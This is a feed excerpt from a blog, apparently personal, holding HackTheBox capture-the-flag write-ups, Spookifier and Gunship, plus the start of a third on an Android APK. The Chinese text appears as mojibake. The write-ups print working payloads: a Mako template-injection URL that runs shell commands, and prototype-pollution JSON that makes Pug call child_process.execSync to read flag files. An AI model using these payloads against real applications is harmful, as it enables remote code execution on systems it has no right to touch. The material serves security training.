    <title>HackTheBox-Challenges Spookifier Writeup</title>
    <link href="https://kazma.tw/2024/10/31/HackTheBox-Challenges-Spookifier-Writeup/"/>
    <id>https://kazma.tw/2024/10/31/HackTheBox-Challenges-Spookifier-Writeup/</id>
    <published>2024-10-31T04:59:04.232Z</published>
    <updated>2024-10-31T05:42:37.562Z</updated>
    
    <content type="html"><![CDATA[<p>å‰›å¥½é€™å¹¾å¤©åœ¨è¬è–ç¯€æ‡‰æ™¯è§£åˆ°é€™é¡ŒXD<br>é¦–å…ˆä¸‹é¢æ˜¯é€™é¡Œçš„æ–‡ä»¶æ¶æ§‹ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">â•°â”€ tree .                                              â”€â•¯</span><br><span class="line">.</span><br><span class="line">â”œâ”€â”€ Dockerfile</span><br><span class="line">â”œâ”€â”€ build-docker.sh</span><br><span class="line">â”œâ”€â”€ challenge</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ application</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ blueprints</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”‚Â Â  â””â”€â”€ routes.py</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ main.py</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ static</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”‚Â Â  â”œâ”€â”€ css</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”‚Â Â  â”‚Â Â  â”œâ”€â”€ index.css</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”‚Â Â  â”‚Â Â  â””â”€â”€ nes.css</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”‚Â Â  â””â”€â”€ images</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”‚Â Â      â””â”€â”€ vamp.png</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ templates</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”‚Â Â  â””â”€â”€ index.html</span><br><span class="line">â”‚Â Â  â”‚Â Â  â””â”€â”€ util.py</span><br><span class="line">â”‚Â Â  â””â”€â”€ run.py</span><br><span class="line">â”œâ”€â”€ config</span><br><span class="line">â”‚Â Â  â””â”€â”€ supervisord.conf</span><br><span class="line">â””â”€â”€ flag.txt</span><br></pre></td></tr></table></figure></div><p>æˆ‘å€‘é€›ä¸€ä¸‹ç¶²ç«™é‚„æœ‰çœ‹ä¸€ä¸‹ <code>main.py</code> å¯ä»¥çœ‹åˆ°ä»–æ˜¯ç”¨ python mako å¯«çš„ï¼Œä¸éå…¶å¯¦æˆ‘å€‘ç…§è‘— ssti çš„ checklist æ¸¬è©¦ä¹Ÿå¯ä»¥çŸ¥é“ä»–æ˜¯ç”¨ makoã€‚<br>çŸ¥é“æ˜¯ ssti ä»¥å¾Œæˆ‘å€‘å°±å¯ä»¥æ’ˆ flag äº†ï¼Œé€™é‚Šæ”¾ä¸Šæœ€å¾Œçš„ payload åƒè€ƒï¼š<br><code>http://94.237.63.215:32454/?text=$&#123;self.module.runtime.util.os.popen(%22cat%20../flag*%22).read()&#125;</code></p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/spoolifier_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å‰›å¥½é€™å¹¾å¤©åœ¨è¬è–ç¯€æ‡‰æ™¯è§£åˆ°é€™é¡ŒXD&lt;br&gt;é¦–å…ˆä¸‹é¢æ˜¯é€™é¡Œçš„æ–‡ä»¶æ¶æ§‹ï¼š&lt;/p&gt;
&lt;div class=&quot;highlight-container&quot; data-rel=&quot;Bash&quot;&gt;&lt;figure class=&quot;iseeu highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="web" scheme="https://kazma.tw/tags/web/"/>
    
    <category term="ssti" scheme="https://kazma.tw/tags/ssti/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Gunship Writeup</title>
    <link href="https://kazma.tw/2024/10/30/HackTheBox-Challenges-Gunship-Writeup/"/>
    <id>https://kazma.tw/2024/10/30/HackTheBox-Challenges-Gunship-Writeup/</id>
    <published>2024-10-30T14:49:00.775Z</published>
    <updated>2024-10-30T16:10:09.888Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>é€™æ¬¡è¦ä¾†åšçš„æ˜¯ä¸€é¡Œ Web è€Œä¸”æœ‰é™„ä¸Š Source Code é‚„æœ‰ Dockerfileï¼Œç¶²ç«™ç•«é¢å¾ˆæ¼‚äº®ï¼Œåªæœ‰ä¸€å€‹è¼¸å…¥é»ã€‚<br>é€™é¡Œé›–ç„¶æ¨™éå¸¸ç°¡å–®ä½†å€‹äººèªç‚ºæœ‰å¾ˆå¤šå€¼å¾—æˆ‘å€‘æ¢è¨çš„çŸ¥è­˜é»ï¼Œä¸€èµ·ä¾†ç ”ç©¶å§ã€‚</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>é€™é¡Œçš„æª”æ¡ˆçµæ§‹å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">â•°â”€ tree .                                                                                                           â”€â•¯</span><br><span class="line">.</span><br><span class="line">â”œâ”€â”€ Dockerfile</span><br><span class="line">â”œâ”€â”€ build-docker.sh</span><br><span class="line">â”œâ”€â”€ challenge</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ flag</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ index.js</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ package.json</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ routes</span><br><span class="line">â”‚Â Â  â”‚Â Â  â””â”€â”€ index.js</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ static</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ css</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”‚Â Â  â””â”€â”€ main.css</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ images</span><br><span class="line">â”‚Â Â  â”‚Â Â  â”‚Â Â  â””â”€â”€ favicon.png</span><br><span class="line">â”‚Â Â  â”‚Â Â  â””â”€â”€ js</span><br><span class="line">â”‚Â Â  â”‚Â Â      â””â”€â”€ main.js</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ views</span><br><span class="line">â”‚Â Â  â”‚Â Â  â””â”€â”€ index.html</span><br><span class="line">â”‚Â Â  â””â”€â”€ yarn.lock</span><br><span class="line">â”œâ”€â”€ config</span><br><span class="line">â”‚Â Â  â””â”€â”€ supervisord.conf</span><br><span class="line">â””â”€â”€ entrypoint.sh</span><br><span class="line"></span><br><span class="line">9 directories, 13 files</span><br></pre></td></tr></table></figure></div><p>ç¨‹å¼ç¢¼ä¸å¤šï¼Œå…¶ä¸­ç‰¹åˆ¥ç›´å¾—æ³¨æ„çš„æ˜¯ index.jsã€‚</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path              = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express           = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> pug        = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; unflatten &#125;     = <span class="built_in">require</span>(<span class="string">&#x27;flat&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> router            = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">sendFile</span>(path.<span class="title function_">resolve</span>(<span class="string">&#x27;views/index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/submit&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; artist &#125; = <span class="title function_">unflatten</span>(req.<span class="property">body</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Haigh&#x27;</span>) || artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Westaway&#x27;</span>) || artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Gingell&#x27;</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line"><span class="string">&#x27;response&#x27;</span>: pug.<span class="title function_">compile</span>(<span class="string">&#x27;span Hello #&#123;user&#125;, thank you for letting us know!&#x27;</span>)(&#123; <span class="attr">user</span>: <span class="string">&#x27;guest&#x27;</span> &#125;)</span><br><span class="line">&#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line"><span class="string">&#x27;response&#x27;</span>: <span class="string">&#x27;Please provide us with the full name of an existing member.&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure></div><p>å…¶ä¸­ç‰¹åˆ¥å€¼å¾—æ‹¿å‡ºä¾†èªªæ˜çš„æ˜¯ï¼š</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/submit&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; artist &#125; = <span class="title function_">unflatten</span>(req.<span class="property">body</span>);</span><br></pre></td></tr></table></figure></div><p>ä¸Šé¢é€™æ®µå°±æ˜¯å”¯ä¸€ä½¿ç”¨è€…è¼¸å…¥çš„ post è«‹æ±‚ï¼Œunflattern å‰‡æ˜¯æœƒæŠŠå¹³é¢åŒ–çš„è³‡æ–™é‚„åŸæˆåµŒå¥—çš„ç‰©ä»¶ï¼Œé€™ä»£è¡¨ req.body å¯ä»¥åŒ…å«é¡ä¼¼ <code>&#123;&quot;artist.name&quot;: &quot;Haigh&quot;&#125;</code> é€™æ¨£çš„å¹³é¢è³‡æ–™ï¼Œé€é unflatten è½‰æ›æˆ <code>&#123; artist: &#123; name: &quot;Haigh&quot; &#125; &#125;</code>ã€‚<br>ç„¶å¾Œ <code>const &#123; artist &#125; = unflatten(req.body);</code> æœƒå¾ä¸­æå– artist å­—æ®µã€‚<br>å†ä¾†æ˜¯æª¢æŸ¥æ¢ä»¶ï¼š</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Haigh&#x27;</span>) || artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Westaway&#x27;</span>) || artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Gingell&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line">        <span class="string">&#x27;response&#x27;</span>: pug.<span class="title function_">compile</span>(<span class="string">&#x27;span Hello #&#123;user&#125;, thank you for letting us know!&#x27;</span>)(&#123; <span class="attr">user</span>: <span class="string">&#x27;guest&#x27;</span> &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line">        <span class="string">&#x27;response&#x27;</span>: <span class="string">&#x27;Please provide us with the full name of an existing member.&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>æœƒæª¢æŸ¥æ˜¯å¦åŒ…å«ç‰¹å®šåå­—ï¼Œç¬¦åˆæ¢ä»¶å°±æœƒä½¿ç”¨ <code>pug.compile</code> ç”Ÿæˆ HTML å…§å®¹ï¼Œä¸¦å‚³å…¥ä¸€å€‹è®Šæ•¸ userï¼ˆå€¼ç‚º â€˜guestâ€™ï¼‰ï¼Œç”¢ç”Ÿé¡ä¼¼ Hello guest, thank you for letting us know! çš„è¨Šæ¯ã€‚<br>é‚£ä¸Šé¢æåˆ°çš„é€™å…©æ®µå…¶å¯¦æ˜¯æœ‰ Prototype Pollution çš„é¢¨éšªï¼Œå› ç‚ºé€™æ®µç¨‹å¼ç¢¼ä½¿ç”¨ unflatten è§£æä½¿ç”¨è€…è¼¸å…¥çš„ req.bodyï¼Œè€Œå¦‚æœä½¿ç”¨è€…è¼¸å…¥äº†ç‰¹æ®Šéµå€¼ï¼ˆå¦‚ <strong>proto</strong> æˆ– constructorï¼‰ï¼Œåœ¨è§£å±•å¾Œå¯èƒ½æ”¹è®Š Object.prototype çš„å…§å®¹ï¼Œé€ æˆåŸå‹æ±¡æŸ“ã€‚èˆ‰ä¾‹ï¼š</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ”»æ“Šè€…å¦‚æœè¼¸å…¥:</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;artist.name&quot;</span>: <span class="string">&quot;Haigh&quot;</span>,</span><br><span class="line">  <span class="string">&quot;__proto__.polluted&quot;</span>: <span class="string">&quot;malicious&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è§£å±•å¾Œçš„ç‰©ä»¶å¯èƒ½æ±¡æŸ“å…¨åŸŸåŸå‹</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;&#125;.<span class="property">polluted</span>); <span class="comment">// &quot;malicious&quot;</span></span><br></pre></td></tr></table></figure></div><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>é¦–å…ˆæˆ‘å€‘çš„é¦–è¦ç›®æ¨™æ˜¯è¦è§¸ç™¼ <code>pug.compile</code>ï¼Œå› ç‚ºæˆ‘å€‘å¯ä»¥è©¦åœ–é€é prototype pollution è®“ pug åœ¨æ¸²æŸ“çš„æ™‚å€™ä½¿ç”¨è¢«æˆ‘å€‘æ±¡æŸ“çš„ block ç‰©ä»¶ï¼ŒåŸ·è¡Œ <code>execSync()</code> ä¹‹é¡çš„æŒ‡ä»¤æ“ä½œã€‚<br>æ‰€ä»¥æˆ‘å€‘å¯ä»¥é€é burp å»æ””æˆª &#x2F;api&#x2F;submit çš„å°åŒ…ï¼Œç„¶å¾ŒæŠŠ content æ›æˆï¼š</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;artist.name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Haigh&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__.block&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Text&quot;</span><span class="punctuation">,</span> </span><br><span class="line"><span class="attr">&quot;line&quot;</span><span class="punctuation">:</span> <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;$(ls | grep flag)&#x27;)&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>ç„¶å¾Œæ­£å¸¸ä¾†èªªæˆ‘å€‘æ˜¯çœ‹ä¸åˆ°è¼¸å‡ºçš„ï¼Œæ‰€ä»¥æœ‰äº›äººå¯èƒ½æœƒé€é reverse shell ä¾†è§£é€™é¡Œï¼Œä½†é€™è£¡æä¾›ä¸€å€‹æœ‰è¶£çš„è§£æ³•æ˜¯ï¼Œæˆ‘å€‘å¯ä»¥é€éåŸ·è¡Œ <code>$(ls | grep flag)</code> è®“æŒ‡ä»¤åŸ·è¡Œçš„çµæœè®Šæˆä¸èƒ½é‹è¡Œçš„æŒ‡ä»¤ï¼Œç„¶å¾Œè·Ÿè‘—éŒ¯èª¤è¨Šæ¯å°å‡ºä¾†ï¼Œèˆ‰ä¾‹åƒæ˜¯å¦‚æœæˆ‘å€‘åŸ·è¡Œï¼š</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;artist.name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Haigh&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__.block&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Text&quot;</span><span class="punctuation">,</span> </span><br><span class="line"><span class="attr">&quot;line&quot;</span><span class="punctuation">:</span> <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;kazma&#x27;)&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>æˆ‘å€‘æœƒå¾—åˆ°ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Command failed: kazma&lt;br&gt;/bin/sh: kazma: not found&lt;br&gt; on line 1&lt;br&gt;</span><br></pre></td></tr></table></figure></div><p>æ‰€ä»¥åœ¨é€™é‚Š kazma è¢«ç•¶æˆæŒ‡ä»¤åŸ·è¡Œï¼Œæ‰€ä»¥æ ¹æˆéŒ¯èª¤è¨Šæ¯å°å‡ºä¾†ï¼ŒåŒæ¨£çš„æˆ‘å€‘å…¶ä»–æŒ‡ä»¤åŸ·è¡Œçš„çµæœä¹Ÿæœƒè¢«ç•¶æˆç„¡æ³•åŸ·è¡Œçš„æŒ‡ä»¤å°å‡ºä¾†ï¼Œå°±å¯ä»¥çœ‹åˆ°è¼¸å‡ºäº†ï¼Œæ‰€ä»¥æˆ‘å€‘æ¥è‘—ä¾†æ‹¿ flagï¼š</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;artist.name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Haigh&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__.block&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Text&quot;</span><span class="punctuation">,</span> </span><br><span class="line"><span class="attr">&quot;line&quot;</span><span class="punctuation">:</span> <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;$(ls | grep flag)&#x27;)&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>æˆ‘å€‘é€å‡ºä¸Šé¢çš„è«‹æ±‚å¯ä»¥æ‹¿åˆ°ä¸‹é¢çš„å›æ‡‰ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Command failed: $(ls | grep flag)&lt;br&gt;/bin/sh: flagvAbC2: not found&lt;br&gt; on line 1&lt;br&gt;</span><br></pre></td></tr></table></figure></div><p>æ‰€ä»¥æª”æ¡ˆåç¨±æ˜¯ <code>flagvAbC2</code>ï¼Œä¸éæˆ‘å€‘ç›´æ¥ cat flag* ä¹Ÿå¯ä»¥ï¼š</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;artist.name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Haigh&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__.block&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Text&quot;</span><span class="punctuation">,</span> </span><br><span class="line"><span class="attr">&quot;line&quot;</span><span class="punctuation">:</span> <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;$(cat flag*)&#x27;)&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>å¾—åˆ°ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Command failed: $(cat flag*)&lt;br&gt;/bin/sh: HTB&#123;wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!&#125;: not found&lt;br&gt; on line 1&lt;br&gt;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/gunship_pwn.png"                      alt="pwn"                ></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://harshitm98.github.io/posts/htb-challenge-gunship/" >https://harshitm98.github.io/posts/htb-challenge-gunship/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;é€™æ¬¡è¦ä¾†åšçš„æ˜¯ä¸€é¡Œ Web è€Œä¸”æœ‰é™„ä¸Š Source Code é‚„æœ‰ Dockerfileï¼Œç¶²ç«™ç•«é¢å¾ˆæ¼‚äº®ï¼Œåªæœ‰ä¸€å€‹</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="web" scheme="https://kazma.tw/tags/web/"/>
    
    <category term="prototype-pollution" scheme="https://kazma.tw/tags/prototype-pollution/"/>
    
    <category term="ast-injection" scheme="https://kazma.tw/tags/ast-injection/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Don&#39;t Overreact Writeup</title>
    <link href="https://kazma.tw/2024/10/30/HackTheBox-Challenges-Don-t-Overreact-Writeup/"/>
    <id>https://kazma.tw/2024/10/30/HackTheBox-Challenges-Don-t-Overreact-Writeup/</id>
    <published>2024-10-30T13:34:48.008Z</published>
    <updated>2024-10-30T13:46:10.856Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>é€™é¡Œæ˜¯ mobile çš„æŒ‘æˆ°ï¼Œçµ¦äº†ä¸€å€‹ .apkã€‚<br>.apkï¼ˆAndroid Packageï¼‰æ˜¯ä¸€ç¨®ç”¨æ–¼ Android æ‡‰ç”¨ç¨‹å¼çš„å®‰è£åŒ…æ ¼å¼ï¼Œé¡ä¼¼ Windows ä¸Šçš„ .exe æˆ–æ˜¯ MacOS çš„ .appï¼ŒåŒ…å«æ‡‰ç”¨ç¨‹å¼çš„æ‰€æœ‰è³‡æºã€åŸå§‹ç¢¼å’Œé…ç½®æ–‡ä»¶ï¼Œè®“æˆ‘å€‘å¯ä»¥åœ¨ Android ä¸Šé¢å®‰è£åŸ·è¡Œã€‚</p><p>.apk æª”æ¡ˆçš„çµæ§‹åŸºæœ¬ä¸Šæ˜¯å£“ç¸®æª”ï¼ˆZIP æ ¼å¼ï¼‰ï¼Œå…§éƒ¨åŒ…å«ä»¥ä¸‹å¹¾ç¨®é‡è¦å…ƒä»¶ï¼š<br>1.AndroidManifest.xmlï¼šæ‡‰ç”¨ç¨‹å¼çš„ä¸»è¦é…ç½®æª”ï¼ŒåŒ…å«æ‡‰ç”¨çš„åç¨±ã€åœ–ç¤ºã€ç‰ˆæœ¬è³‡è¨Šã€æ‰€éœ€çš„æ¬Šé™ï¼ˆå¦‚ç›¸æ©Ÿã€ç¶²è·¯ï¼‰ä»¥åŠå„ç¨®æ´»å‹•ï¼ˆActivityï¼‰ã€æœå‹™ï¼ˆServiceï¼‰ç­‰ã€‚<br>2.classes.dexï¼šåŒ…å«ç·¨è­¯éçš„ Android æ‡‰ç”¨ç¨‹å¼ç¢¼ï¼Œä½¿ç”¨çš„æ˜¯ Dalvik ä½å…ƒçµ„ç¢¼æ ¼å¼ï¼Œé€™æ˜¯ Android ç‰¹æœ‰çš„ Java ä½å…ƒçµ„ç¢¼æ ¼å¼ã€‚<br>3.res&#x2F; è³‡æ–™å¤¾ï¼šåŒ…å«æ‡‰ç”¨çš„è³‡æºæª”æ¡ˆï¼Œå¦‚ UI ä½ˆå±€ã€åœ–ç¤ºã€åœ–ç‰‡å’Œå­—ä¸²ç­‰ã€‚<br>4.lib&#x2F; è³‡æ–™å¤¾ï¼šåŒ…å«æ‡‰ç”¨æ‰€éœ€çš„æœ¬åœ°å‡½å¼åº«æª”æ¡ˆï¼ˆå¦‚ C æˆ– C++ ç·¨å¯«çš„åº«ï¼‰ï¼Œé‡å°ä¸åŒçš„ CPU æ¶æ§‹ï¼ˆå¦‚ ARM æˆ– x86ï¼‰æœ‰ä¸åŒçš„å­è³‡æ–™å¤¾ã€‚<br>5.META-INF&#x2F; è³‡æ–™å¤¾ï¼šåŒ…å«ç°½ç« æª”æ¡ˆï¼Œç”¨ä¾†ç¢ºä¿ .apk 